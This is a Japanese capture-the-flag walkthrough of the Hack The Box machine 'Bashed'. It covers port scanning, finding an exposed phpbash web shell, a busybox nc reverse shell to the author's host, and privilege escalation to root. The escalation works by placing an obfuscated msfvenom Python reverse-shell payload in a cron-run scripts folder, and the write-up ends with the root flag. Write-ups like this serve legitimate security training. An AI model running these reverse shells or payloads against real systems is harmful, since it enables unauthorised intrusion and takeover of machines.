https://app.hackthebox.com/machines/Bashed
## STEP 1
tcp80番がオープン
```sh
└─$ rustscan -a 10.129.14.206 --scripts none         
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
HACK THE PLANET

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.14.206:80
10.129.14.206 -> [80]
```


## STEP 2
80番にアクセス  
大した情報はなさそう  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_01.png">  
列挙するといろいろ発見
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.14.206/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.14.206/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirb/wordlists/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 302ms]
.htpasswd               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 2628ms]
.hta                    [Status: 403, Size: 292, Words: 22, Lines: 12, Duration: 3626ms]
.htaccess               [Status: 403, Size: 297, Words: 22, Lines: 12, Duration: 3631ms]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 298ms]
dev                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 299ms]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 295ms]
images                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 293ms]
index.html              [Status: 200, Size: 7743, Words: 2956, Lines: 162, Duration: 288ms]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 300ms]
php                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 289ms]
server-status           [Status: 403, Size: 301, Words: 22, Lines: 12, Duration: 301ms]
uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 281ms]
:: Progress: [4614/4614] :: Job [1/1] :: 38 req/sec :: Duration: [0:00:42] :: Errors: 0 ::
```
/dev上にphpbash.phpを発見  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_02.png">  
phpbash.phpにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_03.png">  
コマンドが実行できた  
ユーザフラグゲット、ルートフラグはアクセス拒否  
権限昇格を探す  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_04.png">  


## STEP 3
phpbash.php上で「sudo -l」を実行  
パスワードなしでscriptmanager権限のsudoが実行可能
```sh
www-data@bashed:/var/www/html/dev# sudo -l
                                                                                                    
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
scriptmanager権限のsudoで/bin/sh実行ができない  
一旦、scriptmanager権限のリバースシェルをとる  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Bashed_05.png">  
phpbash.php上で実行
```sh
www-data@bashed:/var/www/html/dev# sudo -u scriptmanager busybox nc 10.10.16.4 4444 -e /bin/sh
```
scriptmanager権限のリバースシェル取得！  
しかし/rootにはアクセスできず、権限昇格を目指す  
```sh
└─$ nc -lnvp 4444 
listening on [any] 4444 ...
connect to [10.10.16.4] from (UNKNOWN) [10.129.9.62] 37366

python -c 'import pty; pty.spawn("/bin/bash")'

scriptmanager@bashed:/var/www/html/dev$ ^Z
zsh: suspended  nc -lnvp 4444

└─$ stty raw -echo; fg
[1]  + continued  nc -lnvp 4444
                               ^C

scriptmanager@bashed:/var/www/html/dev$ export SHELL=bash

scriptmanager@bashed:/var/www/html/dev$ export TERM=xterm-256color

scriptmanager@bashed:/var/www/html/dev$ stty rows 66 columns 236

scriptmanager@bashed:/var/www/html/dev$ ls /root
ls /root
ls: cannot open directory '/root': Permission denied
```


## STEP 4
scriptmanager所有のファイルを検索  
```sh
scriptmanager@bashed:/var/www/html/dev$ find / -not -path '/proc/*' -user scriptmanager 2> /dev/null 
<d / -not -path '/proc/*' -user scriptmanager 2> /dev/null                   
/scripts
/scripts/test.py
/home/scriptmanager
/home/scriptmanager/.profile
/home/scriptmanager/.bashrc
/home/scriptmanager/.nano
/home/scriptmanager/.bash_history
/home/scriptmanager/.bash_logout
/dev/pts/1
```
/scriptsの中に、test.pyとtest.txtを発見  
test.pyはtest.txtを作成するっぽい  
test.txtはroot権限  
root権限でtest.pyが実行され、作成されたtest.txtはroot権限になると推測  
root権限のcronでtest.pyが実行されているかも
```sh
scriptmanager@bashed:/var/www/html/dev$ cd /scripts
cd /scripts

scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Apr 22 19:50 test.txt

scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close

scriptmanager@bashed:/scripts$ cat test.txt
cat test.txt
testing 123!
```
`pspy`で詳細なプロセスを確認する  
kaliのhttpサーバにアップロード
```sh
└─$ cp /usr/share/pspy/pspy64 . 

└─$ python3.13 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
`pspy`実行、１分間隔でscirpts内のpythonがroot権限（UID=0）で実行されていることを確認できた  
scripts内の全てのpythonをroot権限で実行しているで、pythonのペイロードを配置すればroot権限のリバースシェルをとれるかも
```sh
scriptmanager@bashed:/scripts$ wget http://10.10.14.109/pspy64
wget http://10.10.14.109/pspy64
--2025-04-25 07:38:05--  http://10.10.14.109/pspy64
Connecting to 10.10.14.109:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: 'pspy64'

pspy64              100%[===================>]   2.96M   451KB/s    in 10s     

2025-04-25 07:38:15 (303 KB/s) - 'pspy64' saved [3104768/3104768]

scriptmanager@bashed:/scripts$ chmod +x pspy64
chmod +x pspy64

scriptmanager@bashed:/scripts$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/04/25 07:42:17 CMD: UID=1001  PID=1161   | ./pspy64 
2025/04/25 07:42:17 CMD: UID=1001  PID=1155   | /bin/sh 
2025/04/25 07:42:17 CMD: UID=0     PID=1154   | sudo -u scriptmanager busybox nc 10.10.14.109 4444 -e /bin/sh 
2025/04/25 07:42:17 CMD: UID=33    PID=1153   | sh -c cd /var/www/html/dev; sudo -u scriptmanager busybox nc 10.10.14.109 4444 -e /bin/sh 2>&1 
2025/04/25 07:42:17 CMD: UID=1001  PID=1094   | ./pspy64 -d /scripts 
2025/04/25 07:42:17 CMD: UID=0     PID=1011   | 
2025/04/25 07:42:17 CMD: UID=33    PID=943    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=33    PID=942    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=33    PID=941    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=33    PID=877    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=33    PID=876    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=33    PID=875    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=33    PID=874    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=33    PID=873    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=0     PID=870    | /usr/sbin/apache2 -k start 
2025/04/25 07:42:17 CMD: UID=0     PID=798    | /sbin/dhclient -1 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33 
2025/04/25 07:42:17 CMD: UID=0     PID=724    | /sbin/agetty --noclear tty1 linux 
2025/04/25 07:42:17 CMD: UID=0     PID=689    | /lib/systemd/systemd-logind 
2025/04/25 07:42:17 CMD: UID=0     PID=687    | /usr/sbin/cron -f 
2025/04/25 07:42:17 CMD: UID=106   PID=664    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
2025/04/25 07:42:17 CMD: UID=104   PID=653    | /usr/sbin/rsyslogd -n 
2025/04/25 07:42:17 CMD: UID=0     PID=652    | /usr/bin/vmtoolsd 
2025/04/25 07:42:17 CMD: UID=0     PID=651    | /usr/lib/accountsservice/accounts-daemon 
2025/04/25 07:42:17 CMD: UID=100   PID=488    | /lib/systemd/systemd-timesyncd 
2025/04/25 07:42:17 CMD: UID=0     PID=375    | /lib/systemd/systemd-udevd 
2025/04/25 07:42:17 CMD: UID=0     PID=352    | vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid 
2025/04/25 07:42:17 CMD: UID=0     PID=339    | 
2025/04/25 07:42:17 CMD: UID=0     PID=320    | 
2025/04/25 07:42:17 CMD: UID=0     PID=318    | /lib/systemd/systemd-journald 
2025/04/25 07:42:17 CMD: UID=0     PID=276    | 
2025/04/25 07:42:17 CMD: UID=0     PID=275    | 
2025/04/25 07:42:17 CMD: UID=0     PID=250    | 
2025/04/25 07:42:17 CMD: UID=0     PID=249    | 
2025/04/25 07:42:17 CMD: UID=0     PID=225    | 
2025/04/25 07:42:17 CMD: UID=0     PID=224    | 
2025/04/25 07:42:17 CMD: UID=0     PID=223    | 
2025/04/25 07:42:17 CMD: UID=0     PID=222    | 
2025/04/25 07:42:17 CMD: UID=0     PID=221    | 
2025/04/25 07:42:17 CMD: UID=0     PID=220    | 
2025/04/25 07:42:17 CMD: UID=0     PID=219    | 
2025/04/25 07:42:17 CMD: UID=0     PID=218    | 
2025/04/25 07:42:17 CMD: UID=0     PID=217    | 
2025/04/25 07:42:17 CMD: UID=0     PID=216    | 
2025/04/25 07:42:17 CMD: UID=0     PID=215    | 
2025/04/25 07:42:17 CMD: UID=0     PID=214    | 
2025/04/25 07:42:17 CMD: UID=0     PID=213    | 
2025/04/25 07:42:17 CMD: UID=0     PID=212    | 
2025/04/25 07:42:17 CMD: UID=0     PID=211    | 
2025/04/25 07:42:17 CMD: UID=0     PID=210    | 
2025/04/25 07:42:17 CMD: UID=0     PID=209    | 
2025/04/25 07:42:17 CMD: UID=0     PID=208    | 
2025/04/25 07:42:17 CMD: UID=0     PID=207    | 
2025/04/25 07:42:17 CMD: UID=0     PID=206    | 
2025/04/25 07:42:17 CMD: UID=0     PID=205    | 
2025/04/25 07:42:17 CMD: UID=0     PID=204    | 
2025/04/25 07:42:17 CMD: UID=0     PID=203    | 
2025/04/25 07:42:17 CMD: UID=0     PID=202    | 
2025/04/25 07:42:17 CMD: UID=0     PID=201    | 
2025/04/25 07:42:17 CMD: UID=0     PID=200    | 
2025/04/25 07:42:17 CMD: UID=0     PID=199    | 
2025/04/25 07:42:17 CMD: UID=0     PID=198    | 
2025/04/25 07:42:17 CMD: UID=0     PID=197    | 
2025/04/25 07:42:17 CMD: UID=0     PID=196    | 
2025/04/25 07:42:17 CMD: UID=0     PID=195    | 
2025/04/25 07:42:17 CMD: UID=0     PID=194    | 
2025/04/25 07:42:17 CMD: UID=0     PID=193    | 
2025/04/25 07:42:17 CMD: UID=0     PID=192    | 
2025/04/25 07:42:17 CMD: UID=0     PID=191    | 
2025/04/25 07:42:17 CMD: UID=0     PID=190    | 
2025/04/25 07:42:17 CMD: UID=0     PID=189    | 
2025/04/25 07:42:17 CMD: UID=0     PID=188    | 
2025/04/25 07:42:17 CMD: UID=0     PID=187    | 
2025/04/25 07:42:17 CMD: UID=0     PID=186    | 
2025/04/25 07:42:17 CMD: UID=0     PID=185    | 
2025/04/25 07:42:17 CMD: UID=0     PID=184    | 
2025/04/25 07:42:17 CMD: UID=0     PID=183    | 
2025/04/25 07:42:17 CMD: UID=0     PID=182    | 
2025/04/25 07:42:17 CMD: UID=0     PID=181    | 
2025/04/25 07:42:17 CMD: UID=0     PID=180    | 
2025/04/25 07:42:17 CMD: UID=0     PID=179    | 
2025/04/25 07:42:17 CMD: UID=0     PID=178    | 
2025/04/25 07:42:17 CMD: UID=0     PID=177    | 
2025/04/25 07:42:17 CMD: UID=0     PID=176    | 
2025/04/25 07:42:17 CMD: UID=0     PID=175    | 
2025/04/25 07:42:17 CMD: UID=0     PID=174    | 
2025/04/25 07:42:17 CMD: UID=0     PID=173    | 
2025/04/25 07:42:17 CMD: UID=0     PID=172    | 
2025/04/25 07:42:17 CMD: UID=0     PID=171    | 
2025/04/25 07:42:17 CMD: UID=0     PID=170    | 
2025/04/25 07:42:17 CMD: UID=0     PID=169    | 
2025/04/25 07:42:17 CMD: UID=0     PID=168    | 
2025/04/25 07:42:17 CMD: UID=0     PID=167    | 
2025/04/25 07:42:17 CMD: UID=0     PID=166    | 
2025/04/25 07:42:17 CMD: UID=0     PID=164    | 
2025/04/25 07:42:17 CMD: UID=0     PID=159    | 
2025/04/25 07:42:17 CMD: UID=0     PID=148    | 
2025/04/25 07:42:17 CMD: UID=0     PID=146    | 
2025/04/25 07:42:17 CMD: UID=0     PID=145    | 
2025/04/25 07:42:17 CMD: UID=0     PID=144    | 
2025/04/25 07:42:17 CMD: UID=0     PID=97     | 
2025/04/25 07:42:17 CMD: UID=0     PID=96     | 
2025/04/25 07:42:17 CMD: UID=0     PID=82     | 
2025/04/25 07:42:17 CMD: UID=0     PID=76     | 
2025/04/25 07:42:17 CMD: UID=0     PID=75     | 
2025/04/25 07:42:17 CMD: UID=0     PID=74     | 
2025/04/25 07:42:17 CMD: UID=0     PID=73     | 
2025/04/25 07:42:17 CMD: UID=0     PID=72     | 
2025/04/25 07:42:17 CMD: UID=0     PID=71     | 
2025/04/25 07:42:17 CMD: UID=0     PID=70     | 
2025/04/25 07:42:17 CMD: UID=0     PID=69     | 
2025/04/25 07:42:17 CMD: UID=0     PID=68     | 
2025/04/25 07:42:17 CMD: UID=0     PID=67     | 
2025/04/25 07:42:17 CMD: UID=0     PID=66     | 
2025/04/25 07:42:17 CMD: UID=0     PID=65     | 
2025/04/25 07:42:17 CMD: UID=0     PID=64     | 
2025/04/25 07:42:17 CMD: UID=0     PID=63     | 
2025/04/25 07:42:17 CMD: UID=0     PID=62     | 
2025/04/25 07:42:17 CMD: UID=0     PID=61     | 
2025/04/25 07:42:17 CMD: UID=0     PID=60     | 
2025/04/25 07:42:17 CMD: UID=0     PID=59     | 
2025/04/25 07:42:17 CMD: UID=0     PID=58     | 
2025/04/25 07:42:17 CMD: UID=0     PID=57     | 
2025/04/25 07:42:17 CMD: UID=0     PID=56     | 
2025/04/25 07:42:17 CMD: UID=0     PID=55     | 
2025/04/25 07:42:17 CMD: UID=0     PID=54     | 
2025/04/25 07:42:17 CMD: UID=0     PID=53     | 
2025/04/25 07:42:17 CMD: UID=0     PID=52     | 
2025/04/25 07:42:17 CMD: UID=0     PID=51     | 
2025/04/25 07:42:17 CMD: UID=0     PID=50     | 
2025/04/25 07:42:17 CMD: UID=0     PID=49     | 
2025/04/25 07:42:17 CMD: UID=0     PID=48     | 
2025/04/25 07:42:17 CMD: UID=0     PID=47     | 
2025/04/25 07:42:17 CMD: UID=0     PID=31     | 
2025/04/25 07:42:17 CMD: UID=0     PID=30     | 
2025/04/25 07:42:17 CMD: UID=0     PID=29     | 
2025/04/25 07:42:17 CMD: UID=0     PID=28     | 
2025/04/25 07:42:17 CMD: UID=0     PID=24     | 
2025/04/25 07:42:17 CMD: UID=0     PID=23     |                                                                                                                                                                                             
2025/04/25 07:42:17 CMD: UID=0     PID=22     | 
2025/04/25 07:42:17 CMD: UID=0     PID=21     | 
2025/04/25 07:42:17 CMD: UID=0     PID=20     | 
2025/04/25 07:42:17 CMD: UID=0     PID=19     | 
2025/04/25 07:42:17 CMD: UID=0     PID=18     | 
2025/04/25 07:42:17 CMD: UID=0     PID=17     | 
2025/04/25 07:42:17 CMD: UID=0     PID=16     | 
2025/04/25 07:42:17 CMD: UID=0     PID=15     | 
2025/04/25 07:42:17 CMD: UID=0     PID=14     | 
2025/04/25 07:42:17 CMD: UID=0     PID=13     | 
2025/04/25 07:42:17 CMD: UID=0     PID=12     | 
2025/04/25 07:42:17 CMD: UID=0     PID=11     | 
2025/04/25 07:42:17 CMD: UID=0     PID=10     | 
2025/04/25 07:42:17 CMD: UID=0     PID=9      | 
2025/04/25 07:42:17 CMD: UID=0     PID=8      | 
2025/04/25 07:42:17 CMD: UID=0     PID=7      | 
2025/04/25 07:42:17 CMD: UID=0     PID=5      | 
2025/04/25 07:42:17 CMD: UID=0     PID=4      | 
2025/04/25 07:42:17 CMD: UID=0     PID=3      | 
2025/04/25 07:42:17 CMD: UID=0     PID=2      | 
2025/04/25 07:42:17 CMD: UID=0     PID=1      | /sbin/init noprompt 
2025/04/25 07:43:01 CMD: UID=0     PID=1171   | python test.py 
2025/04/25 07:43:01 CMD: UID=0     PID=1170   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2025/04/25 07:43:01 CMD: UID=0     PID=1169   | /usr/sbin/CRON -f 
2025/04/25 07:44:01 CMD: UID=0     PID=1174   | python test.py 
2025/04/25 07:44:01 CMD: UID=0     PID=1173   | /bin/sh -c cd /scripts; for f in *.py; do python "$f"; done 
2025/04/25 07:44:01 CMD: UID=0     PID=1172   | /usr/sbin/CRON -f 
```
`msfvenom -p  python/shell_reverse_tcp LHOST=tun0 LPORT=5555`で作成したペイロードを、scripts内に作成
```sh
scriptmanager@bashed:/scripts$ echo "exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNpNjk1LAzEQQM/Jr8htE1zDViqokEORFYqoxe69bJMpDV0zIZPVv29i92AYAm/mzYf/ipiyILQXyGIkQdwvqfkYE1ogqunECQ3pqydJb14O2/d+aEnvP55fD/vhs9+8qSJpiyGAzVI2q07XWJf/sWnvy1OK/5z9BGJIMzxx5kxpSGC/5aq7WyvO/ElMEKRTxnSlzo4Jxgtn0SS9w1gr2oFFB7KZ8+n2oVEtnWGaTB3YUnY+VHW76yvgnP8RpLRQWYQm6qtR9o9Oqps/Ls7CnJXTCIKTqPgvf3dcCw==')[0])))" > shell.py
```
無事リバースシェル取得！
```sh
└─$ rlwrap nc -lnvp 5555
listening on [any] 5555 ...
connect to [10.10.14.109] from (UNKNOWN) [10.129.10.101] 44924

id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
a9c6267ac35a0830b09ef33f595bbc24
```
